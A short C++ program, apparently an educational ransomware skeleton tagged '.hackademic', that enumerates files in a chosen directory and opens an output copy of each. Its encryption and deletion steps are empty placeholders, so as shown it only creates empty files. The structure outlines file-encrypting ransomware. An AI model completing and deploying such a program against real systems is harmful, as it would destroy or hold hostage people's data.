#include <filesystem>
#include <fstream>
#include <iostream>
#include <string>

#define AES_KEY_SIZE    32
#define AES_BLOCK_SIZE  16
#define EXTENSION       ".hackademic"

void encrypt(const std::string filenameIn) {
    // Open fin and fout
    std::string filenameOut = filenameIn + EXTENSION;
    std::ifstream fin(filenameIn, std::ios::binary);
    std::ofstream fout(filenameOut, std::ios::binary);
    if (!fin || !fout) {
        std::cout << " └─[☓] Error opening file.\n";  // cerr?
        return;
    }
    // Encrypt

    // Delete fin and close
    fin.close();
    fout.close();
    std::cout << " └─[✓] Done.\n";
}

int main(int argc, char *argv[]) {
    std::string path;
    if (argc == 1) {
        std::cout << "[/] Enter a path to enumerate: ";
        std::cin >> path;
    } else
        path = argv[1];

    for (const auto &entry : std::filesystem::directory_iterator(path)) {
        std::string filename = entry.path();
        if (!std::filesystem::is_directory(filename)) {
            std::cout << "[#] Encrypting " << filename << "...\n";
            encrypt(filename);
        }
    }
    std::cout << "[#] Encrypting " << "NONEXISTENT.txt...\n";
    encrypt("NONEXISTENT.txt");
    return 0;
}

